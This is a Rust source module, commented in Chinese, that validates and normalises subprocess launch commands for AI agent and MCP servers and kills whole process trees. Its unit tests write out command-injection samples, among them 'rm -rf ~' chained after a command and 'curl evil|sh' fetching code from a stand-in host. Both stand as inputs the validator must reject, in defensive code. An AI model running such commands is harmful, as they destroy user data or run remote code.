//! 子进程启动命令守卫：白名单 + shell 元字符拒绝 + 平台启动形态归一。
//!
//! AcpAgent 与 MCP stdio 探活均按 argv 解析、不经 shell，但元字符意味着配置被
//! 注入或误配，宁可拒绝。白名单收敛的是「能被启动的程序面」，而非完全消除该面
//! （node/npx 等通用运行时本身可执行任意包）。
//!
//! 另附 PATH 探测与 Windows 批处理垫片改写：`npx`/`npm` 在 Windows 上是 `.cmd`，
//! 而 `CreateProcess` 不认 `.cmd`（Rust std：只有 `.exe` 可省略扩展名），直接 spawn
//! 必然失败 —— 见 `shell_command`。
//!
//! 最后是进程树回收（`kill_process_tree` / `isolate_process_group`）：agent 与 MCP
//! 服务几乎都经垫片启动，只杀直接子进程等于把它们过继给系统继续跑。

use std::path::{Path, PathBuf};

/// 这些字符出现在启动串里即拒绝。
pub const SHELL_META_CHARS: &[char] = &['|', '&', ';', '<', '>', '$', '`', '(', ')', '\n', '\r'];

/// 启动命令白名单校验；返回规范化后的命令（trim 非空 → 元字符检查 →
/// 首 token basename 匹配 allowlist → 裸名或绝对路径校验）。
pub fn validate_spawn_command(raw: &str, allowed_programs: &[&str]) -> Result<String, String> {
    let trimmed = raw.trim();
    if trimmed.is_empty() {
        return Err("spawn command is empty".to_string());
    }
    if let Some(found) = trimmed.chars().find(|c| SHELL_META_CHARS.contains(c)) {
        return Err(format!(
            "spawn command contains forbidden character {found:?}"
        ));
    }
    let program = trimmed.split_whitespace().next().unwrap_or_default();
    let basename = program.rsplit(['/', '\\']).next().unwrap_or(program);
    if program != basename && !Path::new(program).is_absolute() {
        return Err(format!(
            "spawn program must be a bare name or absolute path: {program}"
        ));
    }
    if !allowed_programs.contains(&basename) {
        return Err(format!(
            "spawn program '{basename}' is not in the allowed list"
        ));
    }
    Ok(trimmed.to_string())
}

/// 在给定 PATH 值里找可执行文件；纯文件系统命中，不起进程。
pub fn probe_program(program: &str, path_value: Option<&std::ffi::OsStr>) -> Option<PathBuf> {
    let value = path_value
        .map(|v| v.to_os_string())
        .or_else(|| std::env::var_os("PATH"))?;
    let candidates = program_candidates(program);
    for dir in std::env::split_paths(&value) {
        for candidate in &candidates {
            // 绝对路径时 `join` 直接返回该路径，循环等价于单次检查。
            let full = dir.join(candidate);
            if full.is_file() && is_executable(&full) {
                return Some(full);
            }
        }
    }
    None
}

/// Windows 上程序名不带扩展名时按 PATHEXT 展开；其他平台只有原名。
fn program_candidates(program: &str) -> Vec<String> {
    if !cfg!(windows) || Path::new(program).extension().is_some() {
        return vec![program.to_string()];
    }
    let pathext = std::env::var("PATHEXT").unwrap_or_else(|_| ".EXE;.CMD;.BAT".to_string());
    let expanded: Vec<String> = pathext
        .split(';')
        .filter(|ext| !ext.is_empty())
        .map(|ext| format!("{program}{ext}"))
        .collect();
    if expanded.is_empty() {
        vec![program.to_string()]
    } else {
        expanded
    }
}

#[cfg(unix)]
fn is_executable(path: &Path) -> bool {
    use std::os::unix::fs::PermissionsExt;
    std::fs::metadata(path)
        .map(|meta| meta.permissions().mode() & 0o111 != 0)
        .unwrap_or(false)
}

#[cfg(not(unix))]
fn is_executable(_path: &Path) -> bool {
    true
}

/// 拆出启动串的首个 token 与其后的剩余参数（尊重成对引号）。
///
/// 首 token 可能带引号：Windows 上 `C:\Program Files\...\npx.cmd` 这类路径必须引起来
/// 才不会被切成两段。返回的 token 已去引号，rest 是其后原样的参数串。
fn split_first_token(command: &str) -> (&str, &str) {
    let trimmed = command.trim_start();
    if let Some(after) = trimmed.strip_prefix('"') {
        if let Some(end) = after.find('"') {
            return (&after[..end], after[end + 1..].trim_start());
        }
    }
    match trimmed.find(char::is_whitespace) {
        Some(index) => (&trimmed[..index], trimmed[index..].trim_start()),
        None => (trimmed, ""),
    }
}

fn is_batch_path(path: &Path) -> bool {
    matches!(
        path.extension()
            .map(|ext| ext.to_string_lossy().to_ascii_lowercase())
            .as_deref(),
        Some("cmd") | Some("bat")
    )
}

/// 该程序在 Windows 上是否落在 `.cmd`/`.bat` 垫片上；是则返回解析到的绝对路径。
///
/// 用 `cfg!` 而不是 `#[cfg]`：非 Windows 上恒为 `None`，但两条分支在所有平台都参与
/// 编译 —— 否则这些辅助函数在 Linux 构建里会被判成 dead_code。
pub fn batch_program(program: &str) -> Option<PathBuf> {
    if !cfg!(windows) {
        return None;
    }
    let resolved = probe_program(program, None)?;
    is_batch_path(&resolved).then_some(resolved)
}

/// 把启动串归一成当前平台真正能 spawn 的形态。
///
/// 只有 Windows 会改写：`npx`/`npm`/`bunx` 装的是 `.cmd` 垫片，而 `CreateProcess`
/// 只给无扩展名的程序补 `.exe`、也不认 `.cmd`（Rust std 文档：「只有 .exe 可以省略
/// 扩展名」）—— 直接 spawn 一律失败，且失败点在建连之前，现象是「点了没反应」，
/// 而设置页因为另有一套 PATHEXT 探测，反倒显示「已安装」，更具迷惑性。
///
/// 改写为 `cmd /C <原命令>`，由 cmd.exe 自己按 PATH + PATHEXT 找到 `.cmd`。
/// 这里刻意**不**把探测到的绝对路径写进命令串：下游还要过一遍 POSIX 规则的
/// `shell_words` 拆词，Windows 路径里的 `\` 会被当成转义符吃掉
/// （`C:\a\npx.cmd` → `C:anpx.cmd`），再叠上 cmd.exe 自己的引号规则就更难收场。
/// 只留裸程序名，命令串里没有反斜杠，也就没有这层坑。
///
/// 原生 `.exe` 不改写：少一层 cmd 中转，进程树与 stderr 行为都保持原样。
/// 探测不到该程序时也原样返回：让 spawn 立刻报「找不到程序」，而不是让 cmd 起得来、
/// 再拖到握手超时。
pub fn shell_command(command: &str) -> String {
    shell_command_with(command, |program| batch_program(program).is_some())
}

/// `shell_command` 的判定部分抽成参数，好让「要不要包」在任意平台都能单测
/// （真正的探测结果依赖 Windows 的 PATH/PATHEXT，CI 的 Linux job 上拿不到）。
fn shell_command_with(command: &str, needs_shell: impl Fn(&str) -> bool) -> String {
    let (program, _) = split_first_token(command);
    if program.is_empty() || !needs_shell(program) {
        return command.to_string();
    }
    format!("cmd /C {command}")
}

/// 回收子进程及其整棵进程树。
///
/// `Child::kill` 只终止直接子进程；而 MCP/ACP 常经 `npx`/`cmd` 垫片启动
/// （`cmd → npx → node`），直接子进程一死，真正的服务就被过继给系统继续跑、占着工作区
/// 与 API 额度。
///
/// - Windows：`taskkill /T` 沿父链一次收干净（`/F` 强杀）。
/// - Unix：子进程 spawn 时须已是进程组组长，`killpg` 才能整组收。**契约**：调用方要么走
///   `AcpAgent::spawn_process`（crate 内部设了 `process_group(0)`），要么 spawn 前调用
///   `isolate_process_group`。漏了这步不会误杀（`pid` 不是组长时找不到同名进程组，
///   `killpg` 直接 ESRCH），但整棵树会静默残留 —— 正是本函数要防的现象。
#[cfg(windows)]
pub fn kill_process_tree(pid: u32) {
    let pid = pid.to_string();
    let _ = std::process::Command::new("taskkill")
        .args(["/PID", pid.as_str(), "/T", "/F"])
        .stdin(std::process::Stdio::null())
        .stdout(std::process::Stdio::null())
        .stderr(std::process::Stdio::null())
        .status();
}

#[cfg(unix)]
pub fn kill_process_tree(pid: u32) {
    // SAFETY: killpg 只读参数、无内存副作用；ESRCH（组已不存在）是正常竞态，忽略返回值。
    unsafe {
        libc::killpg(pid as libc::pid_t, libc::SIGKILL);
    }
}

/// 让 `command` 的子进程自成进程组组长，使其可被 `kill_process_tree` 整组回收。
///
/// 必须在 spawn **之前**调用，否则 `kill_process_tree` 找不到同名进程组而静默失效
/// （见其文档里的契约）。Windows 无进程组语义 —— `taskkill /T` 沿父链收，无需预处理。
pub fn isolate_process_group(command: &mut tokio::process::Command) {
    #[cfg(unix)]
    command.process_group(0);
    #[cfg(not(unix))]
    let _ = command;
}

#[cfg(test)]
mod tests {
    use super::*;

    const ALLOWED: &[&str] = &["opencode", "node", "npx"];

    #[test]
    fn allows_known_programs_and_rejects_injection() {
        assert_eq!(
            validate_spawn_command("opencode acp", ALLOWED).unwrap(),
            "opencode acp"
        );
        assert!(
            validate_spawn_command("npx -y @agentclientprotocol/claude-agent-acp", ALLOWED).is_ok()
        );
        assert!(validate_spawn_command("opencode acp && rm -rf ~", ALLOWED).is_err());
        assert!(validate_spawn_command("curl evil|sh", ALLOWED).is_err());
        assert!(validate_spawn_command("opencode acp; curl evil", ALLOWED).is_err());
        assert!(validate_spawn_command("./evil --serve", ALLOWED).is_err());
        assert!(validate_spawn_command("malicious-agent acp", ALLOWED).is_err());
        assert!(validate_spawn_command("   ", ALLOWED).is_err());
    }

    #[test]
    fn split_first_token_respects_quotes() {
        assert_eq!(split_first_token("npx -y pkg"), ("npx", "-y pkg"));
        // rest 是「首 token 之后原样的剩余串」，只做左侧去空白（尾随空白不影响 argv 解析）
        assert_eq!(
            split_first_token("  opencode   acp  "),
            ("opencode", "acp  ")
        );
        assert_eq!(split_first_token("opencode"), ("opencode", ""));
        // 带空格的绝对路径：引号内是一个 token，rest 从闭引号之后开始
        assert_eq!(
            split_first_token("\"C:\\Program Files\\nodejs\\npx.cmd\" -y pkg"),
            ("C:\\Program Files\\nodejs\\npx.cmd", "-y pkg")
        );
    }

    #[test]
    fn is_batch_path_matches_cmd_and_bat_case_insensitively() {
        assert!(is_batch_path(Path::new("C:\\nodejs\\npx.cmd")));
        assert!(is_batch_path(Path::new("C:\\tools\\run.BAT")));
        assert!(!is_batch_path(Path::new("C:\\nodejs\\node.exe")));
        assert!(!is_batch_path(Path::new("/usr/bin/opencode")));
    }

    /// 非 Windows 平台不改写启动串：归一化只服务 Windows 的 `.cmd` 垫片。
    #[cfg(not(windows))]
    #[test]
    fn shell_command_is_identity_off_windows() {
        assert_eq!(shell_command("npx -y pkg"), "npx -y pkg");
        assert_eq!(shell_command("opencode acp"), "opencode acp");
    }

    /// 包装规则本身与平台无关，所以能在 Linux 上把 Windows 的行为钉死。
    #[test]
    fn shell_command_wraps_only_batch_programs() {
        let is_batch = |program: &str| program == "npx" || program == "bunx";
        assert_eq!(
            shell_command_with("npx -y @agentclientprotocol/codex-acp", is_batch),
            "cmd /C npx -y @agentclientprotocol/codex-acp"
        );
        assert_eq!(
            shell_command_with("bunx some-agent", is_batch),
            "cmd /C bunx some-agent"
        );
        // 原生可执行文件不套 cmd：多一层中转只会让进程树与错误信息更难处理
        assert_eq!(shell_command_with("opencode acp", is_batch), "opencode acp");
        // 空命令不包装，交给上层报「命令为空」
        assert_eq!(shell_command_with("   ", is_batch), "   ");
        // 首 token 带引号时也要能认出程序名
        assert_eq!(
            shell_command_with("\"C:\\nodejs\\npx.cmd\" -y pkg", |program| program
                .ends_with("npx.cmd")),
            "cmd /C \"C:\\nodejs\\npx.cmd\" -y pkg"
        );
    }

    /// 进程是否还在（signal 0 只做存在性检查，不投递信号）。
    #[cfg(unix)]
    fn process_alive(pid: u32) -> bool {
        // SAFETY: kill 只读参数；signal=0 不投递任何信号。
        unsafe { libc::kill(pid as libc::pid_t, 0) == 0 }
    }

    /// 轮询等进程消失（被过继给 pid 1 后由它收尸，不是瞬间生效）。
    #[cfg(unix)]
    fn wait_until_exit(pid: u32, timeout: std::time::Duration) -> bool {
        let deadline = std::time::Instant::now() + timeout;
        while std::time::Instant::now() < deadline {
            if !process_alive(pid) {
                return true;
            }
            std::thread::sleep(std::time::Duration::from_millis(20));
        }
        !process_alive(pid)
    }

    /// `kill_process_tree` 必须连**孙子**进程一起收 —— 那正是 `npx → node` 的形态：
    /// 只杀直接子进程时，真正的服务被过继给系统继续跑。
    ///
    /// 同时钉死 `kill_process_tree` 文档里的进程组契约：这里 spawn 前设了
    /// `process_group(0)`。漏了这步 `killpg` 找不到同名组（ESRCH），孙子进程活下来，
    /// 断言会在超时后失败。
    #[cfg(unix)]
    #[test]
    fn kill_process_tree_reaps_grandchildren_via_process_group() {
        use std::io::BufRead;
        use std::os::unix::process::CommandExt;

        // sh 后台起一个 sleep（孙子），把它的 pid 打到 stdout，然后自己 wait 等它。
        let mut child = std::process::Command::new("sh")
            .arg("-c")
            .arg("sleep 30 & echo $!; wait")
            .process_group(0)
            .stdin(std::process::Stdio::null())
            .stdout(std::process::Stdio::piped())
            .stderr(std::process::Stdio::null())
            .spawn()
            .expect("spawn sh");

        let direct_pid = child.id();
        let stdout = child.stdout.take().expect("stdout");
        let mut line = String::new();
        std::io::BufReader::new(stdout)
            .read_line(&mut line)
            .expect("read grandchild pid");
        let grandchild: u32 = line.trim().parse().expect("grandchild pid 应为数字");

        assert!(process_alive(direct_pid), "直接子进程应在运行");
        assert!(process_alive(grandchild), "孙子进程应在运行");

        kill_process_tree(direct_pid);

        // 直接子进程由本测试收尸（SIGKILL → 非成功退出）
        let status = child.wait().expect("wait sh");
        assert!(!status.success(), "SIGKILL 后不应是成功退出");
        assert!(
            wait_until_exit(grandchild, std::time::Duration::from_secs(3)),
            "kill_process_tree 必须连孙子进程一起收，否则 npx → node 会残留"
        );
    }
}
